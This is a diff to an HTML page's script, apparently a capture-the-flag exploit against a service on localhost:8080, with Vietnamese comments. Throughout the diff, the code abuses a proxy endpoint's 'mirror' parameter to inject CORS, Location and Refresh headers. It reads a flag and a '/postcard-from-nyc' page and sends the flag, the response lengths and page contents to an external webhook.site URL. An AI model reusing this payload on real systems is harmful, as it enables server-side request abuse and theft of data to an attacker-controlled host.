@@ -9,13 +9,56 @@
 fetch('https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/ping');
 
 // payload chính
-fetch("http://localhost:8080/proxy?url=http://localhost:8080/flag&mirror=Access-Control-Allow-Origin:*")
-.then(r => r.text())
-.then(flag => {
-  const u = encodeURIComponent("https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/?flag=" + flag);
-  fetch("http://localhost:8080/proxy?url=" + u);
-});
+const headers = [
+"Access-Control-Allow-Origin:*",
+"Access-Control-Allow-Credentials:true",
+"Access-Control-Expose-Headers:*",
+"Content-Type:text/plain",
+"Content-Type:application/json",
+"Location:https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/test",
+"Refresh:0;url=https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/test"
+];
 
+for (const h of headers) {
+
+ fetch("http://localhost:8080/proxy?url=http://localhost:8080/flag&mirror=" + encodeURIComponent(h))
+ .then(r=>r.text())
+ .then(t=>{
+   fetch("http://localhost:8080/proxy?url=" + encodeURIComponent(
+     "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/?hdr="+encodeURIComponent(h)+"&len="+t.length
+   ));
+ });
+
+}
+const webhook = "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site";
+
+// 1️⃣ fetch trang postcard
+fetch("http://localhost:8080/proxy?url=http://localhost:8080/postcard-from-nyc&mirror=Access-Control-Allow-Origin:*")
+.then(r => r.text())
+.then(html => {
+
+  // 2️⃣ gửi HTML qua webhook
+  const u = encodeURIComponent(webhook + "/html?len=" + html.length);
+  fetch("http://localhost:8080/proxy?url=" + u);
+
+  // nếu muốn gửi cả content
+  const u2 = encodeURIComponent(webhook + "/html?data=" + encodeURIComponent(html.slice(0,200)));
+  fetch("http://localhost:8080/proxy?url=" + u2);
+
+});
+fetch("http://localhost:8080/postcard-from-nyc")
+.then(r => r.text())
+.then(html => {
+
+  // 2️⃣ gửi HTML qua webhook
+  const u3 = encodeURIComponent(webhook + "/html?len=" + html.length);
+  fetch("http://localhost:8080/proxy?url=" + u3);
+
+  // nếu muốn gửi cả content
+  const u4 = encodeURIComponent(webhook + "/html?data=" + encodeURIComponent(html.slice(0,200)));
+  fetch("http://localhost:8080/proxy?url=" + u4);
+
+});
 </script>
 </body>
 </html>
